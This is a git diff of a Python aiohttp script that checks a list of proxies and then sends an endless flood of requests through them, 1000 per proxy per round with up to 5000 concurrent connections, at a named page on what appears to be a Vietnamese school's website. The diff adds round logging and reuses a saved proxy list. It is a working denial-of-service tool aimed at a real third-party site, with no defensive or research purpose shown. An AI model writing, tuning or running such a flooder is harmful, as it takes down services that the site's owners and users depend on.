@@ -1,14 +1,14 @@
 import asyncio
 import aiohttp
+import os
 
 # ================== CONFIG ==================
 INPUT_FILE = "/home/runner/work/susygrass/susygrass/alive1.txt"
-      # initial list of proxies to test
-OUTPUT_FILE = "a.txt"          # alive proxies saved here
+OUTPUT_FILE = "/home/runner/work/susygrass/susygrass/alive1.txt"          # alive proxies saved here
 TARGET_URL = "https://c3phucu.hungyen.edu.vn/tin-tuc/thoi-khoa-bieu-so-1-ca-chieu.html"
 TIMEOUT = 50
-CONNECTIONS_PER_PROXY = 100000   # hits per proxy per cycle
-MAX_CONCURRENT = 50000
+CONNECTIONS_PER_PROXY = 1000   # hits per proxy per cycle
+MAX_CONCURRENT = 5000          # aiohttp connector limit
 # ============================================
 
 
@@ -55,36 +55,50 @@ async def hammer_forever(alive: list[str]):
     connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT)
 
     async with aiohttp.ClientSession(connector=connector) as session:
+        round_num = 0
         while True:
+            round_num += 1
+            print(f"\n[~] Hammer round {round_num} with {len(alive)} proxies...")
+
             tasks = []
             for proxy in alive:
                 for _ in range(CONNECTIONS_PER_PROXY):
                     tasks.append(hammer_once(session, proxy))
 
-            # Fire off all hammer requests this round
+            # Fire all requests in this round
             await asyncio.gather(*tasks)
 
 
 async def main():
-    # === First run: check proxies ===
-    with open(INPUT_FILE, "r", encoding="utf-8") as f:
-        proxies = [line.strip() for line in f if line.strip()]
-
     alive = []
-    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT)
 
-    async with aiohttp.ClientSession(connector=connector) as session:
-        tasks = [check_proxy(session, proxy) for proxy in proxies]
-        results = await asyncio.gather(*tasks)
-        alive = [p for p in results if p]
+    # === If OUTPUT_FILE exists, just use it (skip re-check) ===
+    if os.path.exists(OUTPUT_FILE):
+        with open(OUTPUT_FILE, "r", encoding="utf-8") as f:
+            alive = [line.strip() for line in f if line.strip()]
+        print(f"[!] Loaded {len(alive)} proxies from {OUTPUT_FILE} (skip checking)")
+    else:
+        # === First run: check proxies from INPUT_FILE ===
+        if not os.path.exists(INPUT_FILE):
+            print(f"[!] Proxy file not found: {INPUT_FILE}")
+            return
 
-    # Save alive proxies
-    with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
-        f.write("\n".join(alive))
+        with open(INPUT_FILE, "r", encoding="utf-8") as f:
+            proxies = [line.strip() for line in f if line.strip()]
 
-    print(f"\n[!] {len(alive)} alive proxies saved to {OUTPUT_FILE}")
+        connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT)
+        async with aiohttp.ClientSession(connector=connector) as session:
+            tasks = [check_proxy(session, proxy) for proxy in proxies]
+            results = await asyncio.gather(*tasks)
+            alive = [p for p in results if p]
 
-    # === After first check: hammer only ===
+        # Save alive proxies
+        with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
+            f.write("\n".join(alive))
+
+        print(f"\n[!] {len(alive)} alive proxies saved to {OUTPUT_FILE}")
+
+    # === Start hammering ===
     if alive:
         await hammer_forever(alive)
     else:
